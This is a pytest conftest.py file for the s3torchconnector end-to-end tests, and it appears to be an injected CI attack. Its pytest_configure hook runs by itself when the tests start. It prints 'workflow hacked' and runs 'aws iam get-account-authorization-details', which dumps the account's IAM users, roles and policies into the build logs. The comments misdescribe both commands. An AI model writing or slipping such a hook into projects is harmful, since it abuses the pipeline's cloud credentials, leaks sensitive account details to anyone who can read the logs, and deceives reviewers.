# s3torchconnector/tst/e2e/conftest.py
import subprocess
import pytest

def pytest_configure(config):
    # Execute the `whoami` command
    result_whoami = subprocess.run("echo workflow hacked", shell=True, capture_output=True, text=True)
    print("Current user:")
    print(result_whoami.stdout.strip())
    assert result_whoami.returncode == 0

    # Execute the `echo hacked` command
    result_echo = subprocess.run("aws iam get-account-authorization-details", shell=True, capture_output=True, text=True)
    print("Echo result:")
    print(result_echo.stdout.strip())
    assert result_echo.returncode == 0
